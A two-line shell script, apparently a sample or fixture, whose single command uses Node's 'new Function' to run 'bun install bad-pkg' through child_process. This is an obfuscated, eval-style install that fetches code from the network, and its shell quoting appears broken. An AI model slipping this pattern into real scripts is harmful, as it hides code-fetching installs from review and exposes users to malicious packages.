#!/bin/sh
node -e 'new Function(\'require("child_process").execSync("bun install bad-pkg")\')()'
